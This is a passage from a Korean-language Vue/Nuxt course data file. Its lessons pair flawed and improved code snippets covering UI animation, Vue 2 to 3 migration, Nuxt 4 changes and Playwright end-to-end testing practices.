.list-enter-from, .list-leave-to { opacity: 0; transform: translateY(8px); }
.list-leave-active { position: absolute; }   /* 빠지는 항목이 자리를 차지하지 않게 */
</style>
`,
        },
        {
          id: 'l5', short: `숫자 카운트`,
          title: `숫자 변화는 useTransition 으로 보간`,
          why: `1,200 에서 3,400 으로 툭 바뀌면 변화를 못 느낍니다. VueUse 의 useTransition 이 중간값을 만들어 주고 이징도 고릅니다.`,
          bad: String.raw`
<span>{{ total }}</span>     <!-- 툭 바뀐다 -->
`,
          good: String.raw`
import { useTransition, TransitionPresets } from '@vueuse/core'

const total = ref(0)
const shown = useTransition(total, { duration: 600, transition: TransitionPresets.easeOutCubic })
<span>{{ Math.round(shown).toLocaleString() }}</span>
`,
        },
        {
          id: 'l6', short: `스크롤 등장`,
          title: `스크롤 등장 효과는 IntersectionObserver 로`,
          why: `scroll 이벤트에서 getBoundingClientRect 를 부르면 스크롤마다 레이아웃을 읽어 버벅입니다. IntersectionObserver 는 보일 때 한 번만 알려 줍니다.`,
          bad: String.raw`
window.addEventListener('scroll', () => {
  els.forEach(el => { if (el.getBoundingClientRect().top < innerHeight) el.classList.add('in') })
})
`,
          good: String.raw`
import { useIntersectionObserver } from '@vueuse/core'

const el = useTemplateRef('card')
const shown = ref(false)
useIntersectionObserver(el, ([entry]) => { if (entry.isIntersecting) shown.value = true }, { threshold: .2 })

<div ref="card" :class="{ in: shown }">...</div>
/* .in { opacity: 1; transform: none; transition: .4s } */
`,
          note: `@vueuse/motion 의 <code>v-motion</code> 디렉티브가 이 패턴을 선언형으로 제공합니다: <code>v-motion :initial="{ opacity: 0, y: 20 }" :visible-once="{ opacity: 1, y: 0 }"</code>.`,
        },
        {
          id: 'l7', short: `View Transitions`,
          title: `페이지 간 요소 연결은 View Transitions API`,
          why: `목록의 썸네일이 상세의 큰 이미지로 이어지는 효과를 손으로 만들면 좌표 계산이 복잡합니다. 브라우저의 View Transitions 가 같은 이름의 요소를 자동으로 이어 줍니다.`,
          bad: String.raw`
// 클릭 시 썸네일 좌표를 재서 복제 요소를 만들어 상세 위치로 옮기는 200줄
`,
          good: String.raw`
// nuxt.config.ts
experimental: { viewTransition: true }

<!-- 목록 -->
<img :src="p.thumb" :style="{ viewTransitionName: 'photo-' + p.id }">
<!-- 상세 -->
<img :src="p.full" :style="{ viewTransitionName: 'photo-' + p.id }">

/* 지원 안 하는 브라우저는 그냥 이동한다 */
::view-transition-old(root), ::view-transition-new(root) { animation-duration: .25s; }
`,
        },
        {
          id: 'l8', short: `정리`,
          title: `requestAnimationFrame 과 타이머는 반드시 정리한다`,
          why: `애니메이션 루프를 돌리다 컴포넌트가 사라지면 루프가 허공에서 계속 돕니다. 페이지를 오갈수록 쌓여 느려집니다.`,
          bad: String.raw`
onMounted(() => {
  function loop() { draw(); requestAnimationFrame(loop) }
  loop()                       // 영원히
})
`,
          good: String.raw`
import { useRafFn } from '@vueuse/core'
const { pause, resume } = useRafFn(draw)     // 언마운트 시 자동 정지

// 직접 할 때
let id = 0
onMounted(() => { const loop = () => { draw(); id = requestAnimationFrame(loop) }; loop() })
onUnmounted(() => cancelAnimationFrame(id))
`,
        },
        {
          id: 'l9', short: `스켈레톤`,
          title: `로딩은 스피너보다 스켈레톤, 레이아웃을 흔들지 않는다`,
          why: `스피너 뒤에 내용이 툭 나타나면 화면이 밀립니다(CLS). 내용 모양의 스켈레톤을 같은 크기로 두면 전환이 자연스럽고 레이아웃 이동이 없습니다.`,
          bad: String.raw`
<Spinner v-if="status === 'pending'" />
<ProductCard v-else :product="data" />     <!-- 높이가 0 → 320px 로 튄다 -->
`,
          good: String.raw`
<ProductCardSkeleton v-if="status === 'pending'" />   <!-- ProductCard 와 같은 높이 -->
<ProductCard v-else :product="data" />

/* 스켈레톤 */
.sk { background: linear-gradient(90deg, var(--line) 25%, var(--surface) 50%, var(--line) 75%);
      background-size: 200% 100%; animation: shimmer 1.2s infinite; }
@keyframes shimmer { to { background-position: -200% 0 } }
`,
        },
        {
          id: 'l10', short: `드래그`,
          title: `드래그 정렬은 라이브러리와 키보드 대안`,
          why: `mousedown/mousemove 로 직접 만든 드래그는 터치, 스크롤, 접근성을 놓칩니다. 검증된 라이브러리를 쓰고, 위/아래 이동 버튼 같은 키보드 대안을 둡니다.`,
          bad: String.raw`
@mousedown="start" @mousemove="move" @mouseup="end"    <!-- 터치 안 됨, 키보드 안 됨 -->
`,
          good: String.raw`
import { useSortable } from '@vueuse/integrations/useSortable'   // SortableJS

const list = useTemplateRef('list')
useSortable(list, items, { animation: 150, handle: '.grip' })

<ul ref="list">
  <li v-for="(it, i) in items" :key="it.id">
    <span class="grip" aria-hidden="true">⋮⋮</span> {{ it.name }}
    <button @click="move(i, -1)" aria-label="위로">↑</button>
    <button @click="move(i, 1)" aria-label="아래로">↓</button>
  </li>
</ul>
`,
        },
      ],
    },
    {
      id: 'vue-19', no: 19, name: `Vue 2 → 3 마이그레이션`,
      lead: `Vue 2 코드를 Vue 3 로 옮길 때 꼭 바뀌는 것들입니다. 왼쪽이 Vue 2 방식, 오른쪽이 Vue 3 방식입니다.`,
      lessons: [
        {
          id: 'l1', short: `앱 생성`,
          title: `new Vue 대신 createApp`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `전역 Vue 객체에 플러그인과 컴포넌트를 등록하던 방식은 앱이 둘이면 서로 섞였습니다. createApp 이 만든 인스턴스에 등록합니다.`,
          bad: String.raw`
import Vue from 'vue'
Vue.use(Router)
Vue.component('MyButton', MyButton)
Vue.prototype.$http = axios
new Vue({ router, store, render: h => h(App) }).$mount('#app')
`,
          good: String.raw`
import { createApp } from 'vue'
const app = createApp(App)
app.use(router).use(pinia)
app.component('MyButton', MyButton)
app.config.globalProperties.$http = axios     // 가능하지만 provide/inject 가 낫다
app.mount('#app')
`,
        },
        {
          id: 'l2', short: `v-model`,
          title: `value/input 대신 modelValue/update:modelValue, .sync 는 v-model:이름`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `커스텀 컴포넌트의 v-model 계약이 바뀌었고, .sync 수식어는 v-model 의 인자로 합쳐졌습니다.`,
          bad: String.raw`
<!-- 자식 -->
props: ['value'],
this.$emit('input', v)
<!-- 부모 -->
<Child v-model="name" :title.sync="title" />
`,
          good: String.raw`
<!-- 자식 -->
const model = defineModel<string>()           // modelValue / update:modelValue
const title = defineModel<string>('title')
<!-- 부모 -->
<Child v-model="name" v-model:title="title" />
`,
        },
        {
          id: 'l3', short: `필터`,
          title: `필터는 사라졌다, 함수나 computed 로`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `| currency 같은 필터 문법이 제거되었습니다. 그냥 함수 호출이나 computed 로 바꿉니다.`,
          bad: String.raw`
{{ price | currency }}
filters: { currency(v) { return v.toLocaleString() + '원' } }
`,
          good: String.raw`
{{ formatCurrency(price) }}

// utils/format.ts
export const formatCurrency = (v: number) => v.toLocaleString() + '원'
// 전역으로 쓰려면 app.config.globalProperties.$fmt 또는 자동 import(Nuxt utils/)
`,
        },
        {
          id: 'l4', short: `이벤트 버스`,
          title: `$on/$off 이벤트 버스는 mitt 나 상태로`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `컴포넌트 인스턴스의 $on, $off, $once 가 제거되어 new Vue() 를 버스로 쓰던 패턴이 사라졌습니다. 대부분은 공유 상태(Pinia)로 바꾸는 것이 맞고, 정말 이벤트면 mitt 를 씁니다.`,
          bad: String.raw`
export const bus = new Vue()
bus.$emit('toast', '저장됨')
bus.$on('toast', show)
`,
          good: String.raw`
// 대부분: 상태로
const toast = useToastStore(); toast.show('저장됨')

// 정말 이벤트가 필요하면
import mitt from 'mitt'
export const emitter = mitt<{ toast: string }>()
emitter.emit('toast', '저장됨')
emitter.on('toast', show); onUnmounted(() => emitter.off('toast', show))
`,
        },
        {
          id: 'l5', short: `$listeners, $children`,
          title: `$listeners 는 $attrs 에 합쳐졌고 $children 은 없다`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `이벤트 리스너도 $attrs 에 onXxx 로 들어옵니다. 자식 목록을 뒤지던 $children 은 사라졌으니 템플릿 ref 로 명시합니다.`,
          bad: String.raw`
<input v-bind="$attrs" v-on="$listeners">
this.$children[0].reset()
`,
          good: String.raw`
<input v-bind="$attrs">                    <!-- class, style, onInput 전부 포함 -->

const child = useTemplateRef('child')
child.value?.reset()                       // 자식이 defineExpose 한 것만
`,
        },
        {
          id: 'l6', short: `라이프사이클`,
          title: `destroyed 는 unmounted, 훅 이름이 바뀌었다`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `beforeDestroy/destroyed 가 beforeUnmount/unmounted 로 바뀌었고, Composition API 에서는 on 접두사를 붙입니다. @hook: 이벤트도 vue: 접두사로 바뀌었습니다.`,
          bad: String.raw`
beforeDestroy() { clearInterval(this.timer) },
destroyed() { ... }
<Child @hook:mounted="onChildMounted" />
`,
          good: String.raw`
onBeforeUnmount(() => clearInterval(timer))
onUnmounted(() => { ... })
<Child @vue:mounted="onChildMounted" />
`,
        },
        {
          id: 'l7', short: `Transition 클래스`,
          title: `v-enter 는 v-enter-from, v-leave 는 v-leave-from`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `전환 클래스 이름이 바뀌어 옛 CSS 를 그대로 두면 애니메이션이 조용히 사라집니다.`,
          bad: String.raw`
.fade-enter, .fade-leave-to { opacity: 0; }
`,
          good: String.raw`
.fade-enter-from, .fade-leave-to { opacity: 0; }
.fade-enter-active, .fade-leave-active { transition: opacity .3s; }
`,
        },
        {
          id: 'l8', short: `반응성 API`,
          title: `Vue.set / Vue.delete 와 배열 index 제한이 사라졌다`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `Vue 3 는 Proxy 기반이라 새 속성 추가, 배열 index 대입, 삭제가 그냥 반응합니다. Vue.set 호출은 지워도 됩니다.`,
          bad: String.raw`
Vue.set(this.user, 'nickname', 'kim')
Vue.set(this.list, 2, item)
Vue.delete(this.user, 'tmp')
`,
          good: String.raw`
user.nickname = 'kim'
list.value[2] = item
delete user.tmp
`,
          note: `단, Vue 3 에서도 <code>reactive</code> 를 통째로 재할당하거나 구조 분해하면 끊깁니다 (3회차 01번).`,
        },
        {
          id: 'l9', short: `mixin → 컴포저블`,
          title: `mixin 은 컴포저블로`,
          badLabel: `✕ Vue 2`, goodLabel: `✓ Vue 3`,
          why: `mixin 은 어디서 온 속성인지 보이지 않고 이름이 충돌합니다. 컴포저블은 import 와 구조 분해로 출처와 이름이 드러납니다.`,
          bad: String.raw`
export const paginationMixin = { data() { return { page: 1 } }, methods: { next() { this.page++ } } }
export default { mixins: [paginationMixin] }     // this.page 가 어디서 왔는지 안 보인다
`,
          good: String.raw`
export function usePagination(initial = 1) {
  const page = ref(initial)
  const next = () => page.value++
  return { page, next }
}
const { page, next } = usePagination()           // 출처가 보인다, 이름은 바꿀 수 있다
`,
        },
        {
          id: 'l10', short: `점진적 전환`,
          title: `한 번에 옮기지 말고 호환 빌드로 단계적으로`,
          why: `큰 앱을 한 번에 옮기면 수백 개 오류가 동시에 납니다. @vue/compat 로 Vue 2 동작을 흉내내며 경고를 하나씩 지우고, 마지막에 호환 모드를 끕니다.`,
          bad: String.raw`
npm install vue@3     # 모든 것이 동시에 깨진다
`,
          good: String.raw`
# 1. 호환 빌드 설치: Vue 2 동작을 유지하면서 Vue 3 로 실행
npm install vue@3 @vue/compat
# vite/webpack alias: vue → @vue/compat, compilerOptions.compatConfig: { MODE: 2 }

# 2. 콘솔의 deprecation 경고를 기능별로 끈다 (configureCompat) 하나씩 고친다
# 3. 라이브러리 교체: vuex → pinia, vue-router 3 → 4, vue-i18n 8 → 9
# 4. MODE: 3 으로 바꾸고 @vue/compat 제거
`,
          lang: 'plain',
        },
      ],
    },
    {
      id: 'vue-20', no: 20, name: `Nuxt 4 변화`,
      lead: `Nuxt 3 에서 4 로 갈 때 바뀌는 것들입니다. 대부분은 Nuxt 3 에서도 compatibilityVersion: 4 로 미리 켤 수 있습니다.`,
      lessons: [
        {
          id: 'l1', short: `app/ 디렉터리`,
          title: `앱 코드는 app/ 아래로`, ver: `Nuxt 4`,
          badLabel: `✕ Nuxt 3 구조`, goodLabel: `✓ Nuxt 4 구조`,
          why: `pages, components, composables 가 루트에 server, public, nuxt.config 와 섞여 있던 것을 app/ 로 모읍니다. IDE 와 파일 감시 범위가 좁아지고 서버 코드와 명확히 나뉩니다.`,
          bad: String.raw`
nuxt.config.ts
app.vue
pages/
components/
composables/
server/
public/
`,
          good: String.raw`
nuxt.config.ts
app/
  app.vue
  pages/
  components/
  composables/
  layouts/
  middleware/
  utils/
server/
shared/        # 클라이언트와 서버가 함께 쓰는 타입, 스키마 (자동 import: shared/utils, shared/types)
public/
`,
          note: `마이그레이션: <code>npx codemod@latest nuxt/4/migration-recipe</code> 가 파일 이동을 해 줍니다. Nuxt 3.12+ 에서는 <code>future: { compatibilityVersion: 4 }</code> 로 미리 적용할 수 있습니다.`,
        },
        {
          id: 'l2', short: `data 기본값`,
          title: `useFetch 의 data 기본값은 null 이 아니라 undefined`, ver: `Nuxt 4`,
          badLabel: `✕ Nuxt 3`, goodLabel: `✓ Nuxt 4`,
          why: `data.value === null 로 검사하던 코드는 Nuxt 4 에서 항상 false 가 됩니다. 값이 있는지 보려면 truthy 검사나 undefined 비교로 바꿉니다.`,
          bad: String.raw`
const { data } = await useFetch('/api/user')
if (data.value === null) showEmpty()       // Nuxt 4 에서는 undefined 라 안 걸린다
`,
          good: String.raw`
const { data } = await useFetch('/api/user')
if (!data.value) showEmpty()

// 기본값을 직접 정하면 둘 다 안전
const { data: items } = await useFetch('/api/items', { default: () => [] })
`,
        },
        {
          id: 'l3', short: `얕은 반응성`,
          title: `data 는 shallowRef 다, 안쪽을 고치면 반응하지 않는다`, ver: `Nuxt 4`,
          badLabel: `✕ Nuxt 3 습관`, goodLabel: `✓ Nuxt 4`,
          why: `성능을 위해 useFetch/useAsyncData 의 data 가 깊은 반응성을 갖지 않습니다. data.value.items.push 는 화면을 갱신하지 않습니다. 통째로 교체하거나 deep 옵션을 켭니다.`,
          bad: String.raw`
const { data } = await useFetch('/api/todos')
data.value.items.push(newTodo)            // Nuxt 4: 화면이 안 바뀐다
`,
          good: String.raw`
data.value = { ...data.value, items: [...data.value.items, newTodo] }   // 교체
// 또는 서버에 반영한 뒤 refresh()
// 정말 깊은 반응성이 필요하면
const { data } = await useFetch('/api/todos', { deep: true })
`,
        },
        {
          id: 'l4', short: `pending → status`,
          title: `pending 대신 status 를 쓴다`, ver: `Nuxt 4`,
          badLabel: `✕ Nuxt 3`, goodLabel: `✓ Nuxt 4`,
          why: `pending 은 폐기 예정입니다. 'idle' | 'pending' | 'success' | 'error' 네 상태를 가진 status 가 immediate: false 같은 경우까지 정확히 표현합니다.`,
          bad: String.raw`
const { data, pending } = await useFetch('/api/items')
<Spinner v-if="pending" />
`,
          good: String.raw`
const { data, status } = await useFetch('/api/items')
<Spinner v-if="status === 'pending'" />
<ErrorBox v-else-if="status === 'error'" />
<List v-else :items="data" />
`,
        },
        {
          id: 'l5', short: `키 공유`,
          title: `같은 키의 useAsyncData 는 옵션도 같아야 한다`, ver: `Nuxt 4`,
          why: `Nuxt 4 는 같은 키를 쓰는 호출이 핸들러와 옵션(transform, pick, deep 등)을 공유합니다. 다르면 개발 모드 경고가 납니다. 키마다 컴포저블 하나로 묶으면 안전합니다.`,
          bad: String.raw`
// A.vue
useAsyncData('users', () => $fetch('/api/users'), { transform: pickNames })
// B.vue
useAsyncData('users', () => $fetch('/api/users'))        // 같은 키, 다른 옵션: 경고
`,
          good: String.raw`
// composables/useUsers.ts
export const useUsers = () => useAsyncData('users', () => $fetch('/api/users'), { transform: pickNames })
// A.vue, B.vue 모두 useUsers() 를 부른다. 결과와 요청이 공유된다
`,
        },
        {
          id: 'l6', short: `라우트 메타 스캔`,
          title: `definePageMeta 는 정적으로 분석된다, 변수 참조 금지`, ver: `Nuxt 4`,
          why: `페이지 메타는 빌드 때 파일에서 추출됩니다. 변수나 import 한 값을 넣으면 추출이 안 되거나 Nuxt 4 에서 오류가 납니다. 리터럴로 적습니다.`,
          bad: String.raw`
const layout = isAdmin ? 'admin' : 'default'
definePageMeta({ layout, middleware: authMiddleware })   // 변수 참조
`,
          good: String.raw`
definePageMeta({ layout: 'admin', middleware: ['auth'] })   // 리터럴만

// 동적으로 바꾸려면 setPageLayout() 또는 <NuxtLayout :name="layout">
`,
        },
        {
          id: 'l7', short: `컴포넌트 이름`,
          title: `컴포넌트 이름은 파일 경로 기준으로 정규화된다`, ver: `Nuxt 4`,
          why: `components/MyButton/MyButton.vue 가 MyButtonMyButton 이 아니라 MyButton 이 되는 규칙은 같지만, 이름과 경로가 다르면 Nuxt 4 가 경로 기준 이름을 씁니다. 파일 이름이 곧 컴포넌트 이름이라 생각하면 됩니다.`,
          bad: String.raw`
// components/form/input.vue 안에서
defineOptions({ name: 'MyInput' })
<MyInput />              // Nuxt 4: 찾지 못한다 (등록 이름은 FormInput)
`,
          good: String.raw`
// components/form/Input.vue → <FormInput />
<FormInput />
// 이름을 바꾸고 싶으면 파일을 옮긴다. defineOptions name 은 devtools 표시용으로만
`,
        },
        {
          id: 'l8', short: `shared/`,
          title: `클라이언트와 서버가 같이 쓰는 코드는 shared/`, ver: `Nuxt 4`,
          why: `zod 스키마나 타입을 server/ 와 app/ 양쪽에서 import 하려면 어느 쪽에도 속하지 않는 자리가 필요합니다. shared/utils 와 shared/types 는 양쪽에서 자동 import 됩니다.`,
          bad: String.raw`
// app/utils/schemas.ts 를 server/api 에서 import   → 서버 번들이 app 코드를 끌어온다
`,
          good: String.raw`
shared/
  utils/validate.ts      # 양쪽에서 자동 import
  types/user.ts
// 명시 import 는 #shared 별칭
import { UserSchema } from '#shared/utils/validate'
`,
        },
        {
          id: 'l9', short: `TS 프로젝트 분리`,
          title: `타입 검사가 app, server, shared 로 나뉜다`, ver: `Nuxt 4`,
          why: `서버 코드에서 Vue 전역(useRoute 등)이 보이거나 그 반대였던 것이 Nuxt 4 에서는 tsconfig 가 분리되어 각자 맞는 전역만 보입니다. 잘못된 import 가 타입 오류로 드러납니다.`,
          bad: String.raw`
// server/api/x.ts
const route = useRoute()            // Nuxt 3: 타입은 통과, 실행하면 터짐
`,
          good: String.raw`
// Nuxt 4: 서버 프로젝트에는 useRoute 가 없어 타입 오류
// 서버에서 요청 정보는 event 로
export default defineEventHandler((event) => getRouterParams(event))

// tsconfig.json 은 .nuxt/tsconfig.app.json, .nuxt/tsconfig.server.json 등을 참조한다
`,
        },
        {
          id: 'l10', short: `compatibilityDate`,
          title: `compatibilityDate 를 꼭 적는다`, ver: `Nuxt 3.12+`,
          why: `Nitro 와 Nuxt 는 동작 변경을 날짜 기준으로 묶습니다. 날짜가 없으면 옛 동작으로 묶이거나 빌드마다 경고가 납니다. 새 프로젝트는 오늘 날짜, 업그레이드할 때 한 번에 올립니다.`,
          bad: String.raw`
export default defineNuxtConfig({ modules: [...] })   // compatibilityDate 없음: 경고, 옛 동작
`,
          good: String.raw`
export default defineNuxtConfig({
  compatibilityDate: '2025-07-15',
  future: { compatibilityVersion: 4 },     // Nuxt 3 에서 4 동작 미리 적용
  modules: [...]
})
`,
        },
      ],
    },
    {
      id: 'vue-21', no: 21, name: `E2E 테스트 (Playwright)`,
      lead: `실제 브라우저로 사용자 흐름을 검증하는 습관입니다. 어떤 셀렉터를 쓰고, 무엇을 기다리고, 무엇을 모킹하고, 테스트를 어떻게 독립시키는지가 E2E 의 전부입니다. 코드 묶음은 실무 코드 20회차에 있습니다.`,
      lessons: [
        {
          id: 'l1', short: `셀렉터`,
          title: `CSS 클래스가 아니라 역할과 라벨로 찾는다`,
          why: `.btn-primary 는 스타일 리팩터링 한 번에 깨집니다. getByRole('button', { name: '저장' }) 은 사용자가 보는 것과 같아서 구현이 바뀌어도 살아남고, 그 자체로 접근성 검사도 됩니다. 꼭 필요한 곳만 data-testid.`,
          bad: String.raw`
await page.click('.form > div:nth-child(3) .btn-primary')
await page.fill('#input-7', 'hello')
await page.locator('div.card').nth(2).click()
`,
          good: String.raw`
await page.getByRole('button', { name: '저장' }).click()
await page.getByLabel('이메일').fill('hello@example.com')
await page.getByRole('link', { name: '주문 내역' }).click()

// 역할·라벨로 못 집는 것만 testid (동적 숫자, 반복 카드)
await expect(page.getByTestId('order-total')).toHaveText('15,000원')
`,
          note: `우선순위: getByRole → getByLabel → getByPlaceholder → getByText → getByTestId → CSS. 역할로 못 잡힌다면 마크업에 라벨이나 role 이 빠진 것일 수 있습니다 (22회차).`,
        },
        {
          id: 'l2', short: `기다림`,
          title: `sleep 으로 기다리지 않는다. locator 와 expect 가 알아서 기다린다`,
          why: `waitForTimeout(2000) 은 느린 환경에서는 모자라고 빠른 환경에서는 낭비입니다. Playwright 의 액션과 expect 는 조건이 될 때까지 자동으로 재시도합니다. 값을 한 번 읽어 비교하는 코드도 재시도가 없어 플래키해집니다.`,
          bad: String.raw`
await page.click('text=저장')
await page.waitForTimeout(2000)                       // 운에 맡기는 2초
expect(await page.locator('.toast').textContent()).toBe('저장했습니다')   // 한 번만 읽는다
await page.waitForLoadState('networkidle')          // 폴링·SSE 가 있으면 영원히 안 온다
`,
          good: String.raw`
await page.getByRole('button', { name: '저장' }).click()
await expect(page.getByRole('status')).toHaveText('저장했습니다')   // 나타날 때까지 재시도 (expect.timeout)

// 비동기 상태 값은 expect.poll
await expect.poll(() => api.getOrder(id).then((o) => o.status)).toBe('PAID')

// 페이지 로드는 "무엇이 보이면 된 것" 으로
await page.goto('/orders')
await expect(page.getByRole('heading', { name: '주문 내역' })).toBeVisible()
`,
        },
        {
          id: 'l3', short: `테스트 독립`,
          title: `테스트는 자기 데이터를 만들고, 순서에 기대지 않는다`,
          why: `"1번 테스트가 만든 상품을 2번이 수정" 하면 1번이 실패하거나 병렬로 돌 때 2번도 깨집니다. 각 테스트가 API 로 자기 데이터를 만들고 고유값을 쓰면 어떤 순서·어떤 워커에서도 같은 결과입니다.`,
          bad: String.raw`
test('상품을 만든다', async ({ page }) => { ... '테스트 상품' 생성 })
test('상품을 수정한다', async ({ page }) => { ... '테스트 상품' 을 찾아 수정 })   // 1번에 의존
test.describe.configure({ mode: 'serial' })        // 순서 강제로 덮는다
`,
          good: String.raw`
test('상품을 수정한다', async ({ page, api }) => {
  const p = await api.createProduct({ name: 'E2E ' + Date.now() })   // 픽스처로 API 호출: 빠르고 독립적
  await page.goto('/admin/products/' + p.id)
  await page.getByLabel('상품명').fill(p.name + ' (수정)')
  await page.getByRole('button', { name: '저장' }).click()
  await expect(page.getByRole('status')).toHaveText('저장했습니다')
})
// 전체 초기화는 setup 프로젝트에서 한 번 (reset + seed). 한 흐름을 검증해야 하면 한 테스트 안의 test.step 으로
`,
        },
        {
          id: 'l4', short: `로그인 재사용`,
          title: `로그인은 setup 에서 한 번, 테스트는 storageState 로 시작한다`,
          why: `테스트마다 로그인 화면을 거치면 느리고 로그인 자체가 플래키 원인이 됩니다. setup 프로젝트가 API 로 로그인해 쿠키를 저장하면 각 테스트는 로그인된 상태에서 바로 시작합니다. 로그인 UI 자체는 테스트 한 개로 따로.`,
          bad: String.raw`
test.beforeEach(async ({ page }) => {
  await page.goto('/login')
  await page.getByLabel('이메일').fill('user@example.com')
  await page.getByLabel('비밀번호').fill('pass')
  await page.getByRole('button', { name: '로그인' }).click()    // 테스트 200개 × 3초
})
`,
          good: String.raw`
// e2e/global.setup.ts
setup('login', async ({ request }) => {
  await request.post('/api/auth/login', { data: { email, password } })
  await request.storageState({ path: 'e2e/.auth/user.json' })
})
// playwright.config.ts
projects: [{ name: 'setup', testMatch: /global\.setup\.ts/ },
           { name: 'chromium', use: { storageState: 'e2e/.auth/user.json' }, dependencies: ['setup'] }]

// 비로그인 테스트만 비운다
test.use({ storageState: { cookies: [], origins: [] } })
`,
        },
        {
          id: 'l5', short: `모킹 범위`,
          title: `외부 서비스와 실패 케이스만 모킹하고, 우리 API 는 진짜로 부른다`,
          why: `우리 백엔드까지 전부 page.route 로 꾸미면 E2E 가 아니라 프론트 단위 테스트가 됩니다. 결제 PG·지도·메일 같은 외부와, 500·느린 응답처럼 실제로 만들기 어려운 상황만 모킹합니다.`,
          bad: String.raw`
await page.route('**/api/**', (route) => route.fulfill({ json: FIXTURES[route.request().url()] }))
// 모든 API 가 가짜: 서버 검증·DB·권한이 실제로 동작하는지는 아무도 모른다
`,
          good: String.raw`
// 외부 SDK 는 스텁으로
await page.route('https://js.tosspayments.com/**', (r) => r.fulfill({ contentType: 'application/javascript', body: FAKE_SDK }))
// 실패 케이스는 딱 그 요청만, 한 번만
await page.route('**/api/products?*', (r) => r.fulfill({ status: 500, json: {} }), { times: 1 })
await page.goto('/products')
await expect(page.getByText('목록을 불러오지 못했습니다')).toBeVisible()
await page.getByRole('button', { name: '다시 시도' }).click()       // 두 번째는 진짜 서버
await expect(page.getByTestId('product-card').first()).toBeVisible()
`,
          note: `서버 쪽에서 외부를 부르는 것(PG 승인 API) 은 브라우저 route 로 못 잡습니다. 서버가 E2E 모드 플래그로 스텁 구현을 쓰게 합니다.`,
        },
        {
          id: 'l6', short: `검증 수준`,
          title: `UI 만 보지 말고, 결과가 서버에 남았는지도 확인한다`,
          why: `"저장했습니다" 토스트가 떴다고 저장된 것은 아닙니다. 낙관적 업데이트는 실패해도 토스트가 뜰 수 있습니다. 중요한 흐름은 API 나 다음 화면으로 결과를 다시 읽어 확인합니다.`,
          bad: String.raw`
await page.getByRole('button', { name: '주문하기' }).click()
await expect(page.getByText('주문이 완료되었습니다')).toBeVisible()
// 끝. 주문이 실제로 PAID 인지, 재고가 줄었는지는 모른다
`,
          good: String.raw`
await page.getByRole('button', { name: '주문하기' }).click()
await expect(page).toHaveURL(/\/orders\/ORD-/)
const orderId = page.url().split('/').pop()!

// 서버 상태로 확인
const order = await api.getOrder(orderId)
expect(order.status).toBe('PAID')
expect(order.lines[0].qty).toBe(2)

// 또는 새로고침 후에도 보이는지 (낙관적 UI 가 아니라 진짜 저장)
await page.reload()
await expect(page.getByText('결제 완료')).toBeVisible()
`,
        },
        {
          id: 'l7', short: `시각 회귀`,
          title: `스크린샷 비교는 핵심 화면 몇 장만, 동적 영역은 가린다`,
          why: `모든 페이지를 찍으면 날짜·아바타·광고 때문에 매번 깨지고, 아무도 diff 를 안 보게 됩니다. 레이아웃 뼈대와 디자인 시스템 컴포넌트, 주요 페이지 5~10장이면 CSS 사고는 잡힙니다.`,
          bad: String.raw`
for (const path of ALL_ROUTES) {
  test(path, async ({ page }) => { await page.goto(path); await expect(page).toHaveScreenshot() })
}
// 120장. 날짜가 바뀌면 40장이 깨지고, 폰트 로드 타이밍으로 또 10장
`,
          good: String.raw`
test('상품 상세', async ({ page }) => {
  await page.goto('/products/p1')
  await page.evaluate(() => document.fonts.ready)                   // 웹폰트 로드 뒤에
  await expect(page).toHaveScreenshot('product-detail.png', {
    fullPage: true,
    mask: [page.getByTestId('review-date'), page.getByTestId('recommend')],   // 동적 영역
    maxDiffPixelRatio: 0.01
  })
})
// config: expect.toHaveScreenshot.animations = 'disabled', 스냅샷은 CI 와 같은 OS(linux) 에서 생성
`,
        },
        {
          id: 'l8', short: `단계와 이름`,
          title: `테스트 이름은 사용자 문장으로, 긴 흐름은 test.step 으로 나눈다`,
          why: `'test1', 'should work' 는 실패 리포트에서 아무 정보가 없습니다. "잘못된 비밀번호면 오류를 보여 준다" 처럼 쓰면 리포트가 명세가 됩니다. 긴 흐름은 step 으로 나눠야 어디서 멈췄는지 보입니다.`,
          bad: String.raw`
test('checkout', async ({ page }) => {
  // 60줄: 장바구니 → 쿠폰 → 결제 → 완료. 실패하면 "checkout failed at line 41"
})
`,
          good: String.raw`
test('쿠폰을 적용하고 결제하면 할인된 금액으로 주문된다', async ({ page, checkout }) => {
  await test.step('장바구니에 상품 2개', async () => { ... })
  await test.step('쿠폰 적용 시 합계가 10% 줄어든다', async () => {
    await checkout.applyCoupon('WELCOME10')
    await expect(checkout.total()).toHaveText('13,500원')
  })
  await test.step('결제 완료 페이지로 이동', async () => { ... })
})
// 리포트: ✓ 장바구니에 상품 2개  ✗ 쿠폰 적용 시 합계가 10% 줄어든다 (스크린샷 첨부)
`,
        },
        {
          id: 'l9', short: `CI 설계`,
          title: `빌드 결과로 돌리고, 샤딩하고, 실패 시 trace 를 남긴다`,
          why: `dev 서버로 돌리면 운영과 다르고 HMR 이 테스트를 흔듭니다. 빌드 한 번 → 샤드 N 개가 나눠 실행 → 실패한 것만 trace·스크린샷 업로드. 재시도는 브라우저 크래시 같은 외부 요인용이지 플래키 테스트를 숨기는 용도가 아닙니다.`,
          bad: String.raw`
- run: npm run dev &            # dev 서버에 대고
- run: npx playwright test      # 한 머신에서 25분
  # 실패하면 로그만 남는다. retries: 5 로 "통과시킨다"
`,
          good: String.raw`
# build job: npm run build → .output 을 artifact 로
# e2e job (matrix shard 1..3):
- run: node .output/server/index.mjs &  # 빌드 결과 (webServer 설정으로 대신해도 된다)
- run: npx playwright test --shard=\${{ matrix.shard }}/3
  env: { CI: true }                      # retries: 2, trace: on-first-retry, forbidOnly
- uses: actions/upload-artifact@v4
  if: failure()
  with: { path: test-results }           # trace.zip → npx playwright show-trace 로 재생
# PR 에는 스모크(핵심 흐름 5분) 만, 전체는 main 머지 후·야간
`,
        },
        {
          id: 'l10', short: `플래키 관리`,
          title: `가끔 실패하는 테스트는 끄지 말고 원인을 셋 중 하나로 분류한다`,
